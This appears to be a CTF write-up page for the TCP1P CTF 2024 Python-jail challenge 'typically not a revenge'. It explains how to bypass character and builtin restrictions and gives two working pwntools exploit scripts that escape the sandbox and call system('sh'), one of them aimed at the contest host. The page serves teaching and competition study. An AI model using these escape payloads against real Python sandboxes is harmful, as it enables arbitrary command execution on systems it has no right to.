@@ -1,0 +1,380 @@
+<!-- https://raw.githubusercontent.com/mkdocs/mkdocs/refs/heads/master/mkdocs/themes/mkdocs/base.html -->
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="light">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        <link rel="canonical" href="https://jia.je/ctf-writeups/misc/pyjail/tcp1p-ctf-2024-typically-not-a-revenge.html">
+        <link rel="shortcut icon" href="../../img/favicon.ico">
+        <title>TCP1P CTF 2024 typically not a revenge - CTF Writeups by @jiegec</title>
+        <link href="../../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../../css/fontawesome.min.css" rel="stylesheet">
+        <link href="../../css/brands.min.css" rel="stylesheet">
+        <link href="../../css/solid.min.css" rel="stylesheet">
+        <link href="../../css/v4-font-face.min.css" rel="stylesheet">
+        <link href="../../css/base.css" rel="stylesheet">
+        <!-- added by @jiegec begin -->
+        <link href=" https://cdn.jsdelivr.net/npm/prismjs@1.30.0/themes/prism.min.css " rel="stylesheet">
+        <!-- added by @jiegec end -->
+        <!-- added by @jiegec begin -->
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/components/prism-core.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/plugins/autoloader/prism-autoloader.min.js"></script>
+        <!-- added by @jiegec end -->
+
+      <!-- added by @jiegec begin -->
+      <script defer src="https://cdn.jsdelivr.net/npm/mathjax@4/tex-mml-chtml.js"></script>
+      </script>
+      
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-3109FRSVTT"></script>
+      <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag() { dataLayer.push(arguments); }
+          gtag('js', new Date());
+      
+          gtag('config', 'G-3109FRSVTT');
+      </script>
+      
+      <script src="https://analytics.jiege.pro/api/script.js" data-site-id="1" defer></script>
+      <!-- added by @jiegec end --> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
+            <div class="container">
+                <a class="navbar-brand" href="../../index.html">CTF Writeups by @jiegec</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="nav-item">
+                                <a href="../../index.html" class="nav-link">Home</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../solution.html" class="nav-link">Writeups by Solution</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../pyjail.html" class="nav-link">Pyjail</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../../puppeteer/index.html" class="nav-link">Redbud Puppeteer</a>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ms-md-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-bs-toggle="modal" data-bs-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-bs-toggle="collapse" data-bs-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-body-tertiary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-bs-level="1"><a href="#tcp1p-ctf-2024-typically-not-a-revenge" class="nav-link">TCP1P CTF 2024 typically not a revenge</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h1 id="tcp1p-ctf-2024-typically-not-a-revenge">TCP1P CTF 2024 typically not a revenge</h1>
+<pre class="highlight"><code class="language-python">#!/usr/bin/env python3
+code = '''
+import sys
+import posix
+
+__builtins__ = sys._getframe(0).f_builtins
+
+for _ in unsafe_builtins:
+    del __builtins__[_]
+unsafe_builtins.clear()
+
+posix.__dict__.clear()
+sys.modules.clear()
+for _ in sys.__dict__:
+    sys.__dict__[_] = None
+
+del sys, posix
+'''
+
+unsafe_builtins = []
+unsafe_chars = 'FT!"#$%&amp;\'()*+-,/;&lt;=&gt;?@\\^`{|}~0123456789\t\n\v '
+
+for _ in __builtins__.__dict__:
+    if not isinstance(__builtins__.__dict__[_], type):
+        unsafe_builtins.append(_)
+    elif _.startswith('_'):
+        unsafe_builtins.append(_)
+    elif _[0].islower():
+        unsafe_builtins.append(_)
+
+user_input = input('Enter code: ').strip()
+for c in set(user_input):
+    if c in unsafe_chars:
+        assert 0, 'Unsafe character detected!'
+
+assert len(user_input.split('\r')) &lt; 3
+assert user_input.isascii()
+exec(code + user_input, {'unsafe_builtins': unsafe_builtins}, {})</code></pre>
+<p>Requirements:</p>
+<ol>
+<li>No numbers: Use <code>arr[[]is[]]</code> for <code>arr[0]</code>, <code>arr[not[]is[]]</code> for <code>arr[1]</code>, <code>arr[not[]is[]:][not[]is[]]</code> for <code>arr[2]</code></li>
+<li>No parens: Use <code>[class[arg] for class.__class_getitem__ in [function_to_call]]</code> to call function</li>
+<li>No assignments or commas: Use <code>[... for a in [b] for c in [d]]</code></li>
+<li>No spaces: Use <code>\f</code> i.e. form feed</li>
+<li>No builtins: Use <code>[].__class__.__base__.__subclasses__()</code></li>
+<li>No sys module: Use <code>&lt;class 'os._wrap_close'&gt;</code> to find system</li>
+</ol>
+<p>Inspired by writeup by @ayapi on Discord, although we use the different attack route eventually:</p>
+<pre class="highlight"><code class="language-python">from pwn import *
+import sys
+
+def bool2index(n):
+    if n == 0:
+        return '[[]is[]]'
+    elif n == 1:
+        return '[not[]is[]]'
+    elif n &gt; 1:
+        return ''.join('[not[]is[]:]' for x in range(n-1))+'[not[]is[]]'
+
+payload = f'''
+try:__loader__
+except Exception as e:[[[[[[[[[[[[[[[[[[[[cls[sh] for cls.__class_getitem__ in [system]] for sh in [cls[h]]] for cls.__class_getitem__ in [s.__add__]] for system in [cls[cls].system]] for cls.__class_getitem__ in [cls.get_source.__globals__[k{bool2index(7)}].__loader__.create_module]] for cls.name in [cls[x]]] for cls.get_source.__globals__[k{bool2index(9)}].builtin_module_names in [[cls[x]]]] for cls.__class_getitem__ in[cls[i].__add__]] for cls.__class_getitem__ in[cls[s].__add__]] for cls.__class_getitem__ in [cls[o].__add__]] for cls.__class_getitem__ in [k{bool2index(2)}{bool2index(2)}.__add__]] for h in [k{bool2index(11)}{bool2index(4)}]] for o in [k{bool2index(1)}{bool2index(3)}]] for s in [k{bool2index(4)}{bool2index(2)}]] for i in [k{bool2index(5)}{bool2index(4)}]] for x in [k{bool2index(21)}{bool2index(10)}]] for k in [cls[cls.get_source.__globals__]]] for cls.__class_getitem__ in [list]] for list in [[].__class__]] for cls in [e.__traceback__.tb_frame.f_back.f_globals[e.name].__class__]]
+'''.strip().replace('\n', '\r').replace(' ', '\f')
+
+r = remote('ctf.tcp1p.team', 32771)
+r.sendline(payload.encode())
+r.interactive()</code></pre>
+<p>To call function, we need a mutable object to write to its <code>__class_getitem__</code>:</p>
+<pre class="highlight"><code class="language-python">for x in __builtins__.__dict__:
+    try:
+        __builtins__.__dict__[x].__class_getitem__ = print
+        print(x)
+    except:
+        pass</code></pre>
+<p>Output:</p>
+<pre class="highlight"><code>__loader__
+__spec__
+ExceptionGroup
+quit
+exit
+copyright
+credits
+license
+help</code></pre>
+<p>Here <code>ExceptionGroup</code> is not a member of <code>unsafe_builtins</code>, so we can use it for function call.</p>
+<p>Steps:</p>
+<ol>
+<li>Call <code>[].__class__.__base__.__subclasses__()</code> via <code>ExceptionGroup.__class_getitem__</code></li>
+<li>Locate <code>&lt;class '_sitebuiltins._Helper'&gt;</code> and <code>&lt;class 'os._wrap_close'&gt;</code> in the subclasses using the array index mechanism of <code>[False]</code>, <code>[True]</code>, <code>[True:][True]</code> ...</li>
+<li>Synthesize <code>"system"</code> and <code>"sh"</code> from <code>_sitebuiltins._Helper.__doc__</code> via <code>"s".__add__("y").__add__("s").__add__("t").__add__("e").__add__("m")</code></li>
+<li>Find <code>system</code> in <code>&lt;class 'os._wrap_close'&gt;.__init__.__globals__["system"]</code></li>
+<li>Call <code>system("sh")</code></li>
+</ol>
+<p>Attach script:</p>
+<pre class="highlight"><code class="language-python">from pwn import *
+
+context(log_level="debug")
+
+subclasses = str(().__class__.__base__.__subclasses__())
+
+# find the indices of the builtins
+# assuming we are using the same Python version as remote
+
+# assuming os_wrap_close is at 158
+os_index = 158
+assert subclasses.split(", ").index("&lt;class 'os._wrap_close'&gt;") == os_index
+# assuming Helper is at 161
+helper_index = 161
+assert subclasses.split(", ").index("&lt;class '_sitebuiltins._Helper'&gt;") == helper_index
+
+helper_doc = ().__class__.__base__.__subclasses__()[helper_index].__doc__
+
+
+def get_index(index):
+    # learn from @ayapi
+    if index == 0:
+        return "[[]is[]]"  # [False] i.e. [0]
+    elif index == 1:
+        return "[not[]is[]]"  # [True] i.e. [1]
+    else:
+        return (
+            "".join(["[not[]is[]:]"] * (index - 1)) + "[not[]is[]]"
+        )  # [True:][True:][True] i.e. [3]
+
+
+p = process(["python3", "jail.py"])
+p.sendline(
+    (
+        "[None "
+        # [].__class__.__class__ = type
+        # ExceptionGroup.__class_getitem__ = type.__subclasses__
+        + "for ExceptionGroup.__class_getitem__ in [[].__class__.__class__.__subclasses__]"
+        # locate helper: type.__subclasses__([].__class__.__base__))[helper_index]
+        + f"for helper in [ExceptionGroup[[].__class__.__base__]{get_index(helper_index)}]"
+        # locate os._wrap_close: type.__subclasses__([].__class__.__base__))[os_index]
+        + f"for os in [ExceptionGroup[[].__class__.__base__]{get_index(os_index)}]"
+        # read helper_doc
+        + "for S in [helper.__doc__]"
+        # prepare to synthesize "system" and "sh"
+        + f"for s in [S{get_index(helper_doc.index("s"))}]"
+        + f"for y in [S{get_index(helper_doc.index("y"))}]"
+        + f"for t in [S{get_index(helper_doc.index("t"))}]"
+        + f"for e in [S{get_index(helper_doc.index("e"))}]"
+        + f"for m in [S{get_index(helper_doc.index("m"))}]"
+        + f"for h in [S{get_index(helper_doc.index("h"))}]"
+        # synthesize "system"
+        + "for ExceptionGroup.__class_getitem__ in [s.__add__]"
+        + f"for sy in [ExceptionGroup[y]]"
+        + "for ExceptionGroup.__class_getitem__ in [sy.__add__]"
+        + f"for sys in [ExceptionGroup[s]]"
+        + "for ExceptionGroup.__class_getitem__ in [sys.__add__]"
+        + f"for syst in [ExceptionGroup[t]]"
+        + "for ExceptionGroup.__class_getitem__ in [syst.__add__]"
+        + f"for syste in [ExceptionGroup[e]]"
+        + "for ExceptionGroup.__class_getitem__ in [syste.__add__]"
+        + f"for system in [ExceptionGroup[m]]"
+        # synthesize "sh"
+        + "for ExceptionGroup.__class_getitem__ in [s.__add__]"
+        + f"for sh in [ExceptionGroup[h]]"
+        # ExceptionGroup.__class_getitem__ = os.__init__.__globals__[system]
+        + "for ExceptionGroup.__class_getitem__ in [os.__init__.__globals__[system]]"
+        # call system("sh")
+        + "for _ in [ExceptionGroup[sh]]"
+        + "]"
+    )
+    .replace(" ", "\f")
+    .encode()
+)
+p.interactive()</code></pre>
+<p>Here is the attack steps used in @ayapi's writeup on Discord:</p>
+<ol>
+<li>Set <code>sys.builtin_module_names = ["posix"]</code></li>
+<li>Create <code>posix</code> module via <code>posix = builtins.__loader__.create_module([builtins.__spec__ for builtins.__spec__.name in ["posix"]][0])</code> (learned from <a href="https://shirajuki.js.org/blog/pyjail-cheatsheet/">Pyjail Cheatsheet</a>)</li>
+<li>Call <code>posix.system("sh")</code></li>
+</ol></div>
+
+                <!-- added by @jiegec begin -->
+                <div class="col-md-3"></div>
+                <div class="col-md-9">
+                  <script src="https://giscus.app/client.js"
+                      data-repo="jiegec/ctf-writeups"
+                      data-repo-id="MDEwOlJlcG9zaXRvcnkxNTE1MzAxODQ="
+                      data-category="General"
+                      data-category-id="DIC_kwDOCQgqyM4CvbYX"
+                      data-mapping="pathname"
+                      data-strict="1"
+                      data-reactions-enabled="1"
+                      data-emit-metadata="0"
+                      data-input-position="top"
+                      data-theme="light"
+                      data-lang="en"
+                      data-loading="lazy"
+                      crossorigin="anonymous"
+                      async>
+                  </script>
+                </div>
+                <!-- added by @jiegec end -->
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+                <p>Copyright &copy; 2025 Jiajie Chen</p>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script src="../../js/bootstrap.bundle.min.js"></script>
+        <script>
+            var base_url = "../..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../../js/base.js"></script>
+        <script src="../../search/main.js"></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
